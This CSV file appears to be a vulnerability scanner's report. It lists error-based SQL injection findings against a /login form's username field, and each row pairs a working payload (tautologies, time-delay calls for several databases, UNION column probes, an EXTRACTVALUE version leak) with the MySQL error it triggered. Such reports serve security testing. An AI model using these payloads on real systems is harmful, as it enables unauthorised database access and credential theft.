Type,Vulnerability,Endpoint,Method,Parameter,Status Code,Severity,Payload,Evidence
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR '1'='1'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR 1=1--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' AND 1=2--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR SLEEP(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; SELECT SLEEP(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' OR pg_sleep(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; SELECT pg_sleep(5)--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; WAITFOR DELAY '00:00:05'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1'; WAITFOR DELAY '0:0:5'--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' OR DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,1' UNION SELECT NULL--,"atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT NULL,NULL--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT NULL,NULL,NULL--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT 1,2,3--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT user(),database(),version()--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
SQL Injection,Error-based SQLi,/login,POST,username,400,High,"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--","atabase error: (1064, \""you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near '"
